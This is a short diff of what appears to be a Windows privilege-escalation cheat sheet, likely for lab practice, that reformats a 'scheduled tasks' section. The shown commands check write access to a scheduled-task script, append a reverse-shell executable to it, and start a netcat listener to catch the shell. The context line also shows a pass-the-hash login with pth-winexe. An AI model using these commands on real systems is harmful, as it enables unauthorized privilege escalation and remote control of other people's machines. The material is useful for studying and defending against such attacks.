@@ -315,14 +315,13 @@ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd
 
 
 
-________________________________________________
-CATEGORY : SCHEDULED TASKS
-________________________________________________
-
+## CATEGORY "SCHEDULED TASKS" - INSECURE PERMISSIONS 
+```
 type C:\DevTools\CleanUp.ps1
 C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
 echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 nc -lvp 123
+```
 
 
 ________________________________________________
